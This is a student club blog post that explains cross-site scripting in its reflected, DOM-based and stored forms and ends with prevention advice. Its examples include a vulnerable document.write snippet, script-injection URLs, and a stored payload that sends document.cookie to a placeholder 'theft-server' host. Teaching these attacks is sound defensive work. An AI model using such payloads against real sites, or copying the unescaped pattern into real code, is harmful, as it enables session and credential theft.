---
title: Cross Site Scripting, simplified
date: 2023-2-22
---
https://acmcsuf.com/blog/778 What is up my ACM folks, today we’re gonna break down and simplify [Cross Site Scripting (XSS)](https://en.wikipedia.org/wiki/Cross-site_scripting) on a higher abstract level. XSS is a pretty common web vulnerability so it’d be beneficial to know a bit about it when developing web applications.

Have you ever wondered what could happen when you click on a sketchy link? Well XSS is one of the many ways links could be used to compromise your system. Let’s go over how.

## What is XSS?

Simply put, XSS occurs when a payload is injected into your browser.

This is a pretty big deal since an attacker can execute JavaScript in your browser, which can fully compromise you. An attack could execute any action in that application and view/modify any data in your window. With this, an attacker could steal your user accounts, hijack credentials, and take sensitive data.

## What types of XSS exist?

When watching out for XSS it comes in 3 main forms, **Reflected**, **DOM-based** and **Stored**.

### Reflected XSS

Reflected XSS occurs when JavaScript is executed with origins from an HTTP request. This is reflected either be a website’s results or response immediately. 

When looking out for reflected XSS it’s important to know that reflected attacks occur in emails or URLs.

Let’s go over a simple made up example that occurs if you were to search for a certain user on twitter.

```
https://twitter.com/search?user=angus
```

In the URL response the application would echo would be

```
<p> You searched for: angus </p>
```

Under the assumption this link isn’t processed in any way, an attacker could modify the URL like so.

```
https://twitter.com/search?user=<script>Malicious stuff </script>
```

Now If a user were to visit this link the malicious JavaScript would be executed in their browser.

### DOM XSS

Now let's go over DOM-based XSS, which occurs when an app has some client side code that is modified to run in an unintended way.

For example a web page can have an input field that is populated through a URL query similar to reflected XSS. This populated input field then causes an issue that makes the DOM behave unexpectedly.

Let’s say we have an input field to choose a pizza type for our pizza order.

```
<select>
<script>

document.write("<OPTION value=1>"+decodeURIComponent(document.location.href.substring(document.location.href.indexOf("default=")+8))+"</OPTION>");

document.write("<OPTION value=2>Pepperoni</OPTION>");

</script>
</select>
```

Let’s say by default the link looks something like this.

```
http://www.papajohns.com/order.html?default=Cheese
```

An attacker could give you a link

```
http://www.papajohns.com/order.html?default=<script>alert(document.cookie)</script>
```

Now the DOM would create an object for that string which could be exploited to steal your cookies.

### Stored XSS

Lastly let's go over Stored XSS, which functions a bit differently then Reflected or DOM XSS. Here the malicious script comes from a server or database. This happens because the application server first received malicious data from input on the application. The input can come in anywhere that input is allowed, like choosing a username, contact info or pretty much any input field on an application or website. Later users receive that data in an HTTP response.

For example some an attacker could input something like this as a username to take a users session identifier cookies.

```
<script>var+img=new+image();img.src="http://theft-server/" + document.cookie;</script>
```

Let’s assume the input wasn’t processed after this, then the website would post this username through an HTTP request and any user who visits that user profile would receive the attacker's intended response.

The reason Stored XSS is a bit more dangerous is because it is self contained in the application, unlike Reflected/DOM XSS where you would have to introduce another user to the exploit through something like a URL.

## Preventing XSS

Some good practices to prevent XSS are to filter your input fields when taking input, encoding output data so it’s not misinterpreted as content, and using proper response headers. You could also use a [Content Security Policy (CSP)](https://en.wikipedia.org/wiki/Content_Security_Policy) HTTP header in your webpages. CSP can make it so only your content only comes from the site origin, allowing/disallowing certain domains and restricting/allowing certain content media types like images, audio, etc.

These are the basic concepts behind XSS, but XSS can get pretty complicated so it’s good to look into some of the more advanced techniques in which it could manifest itself.
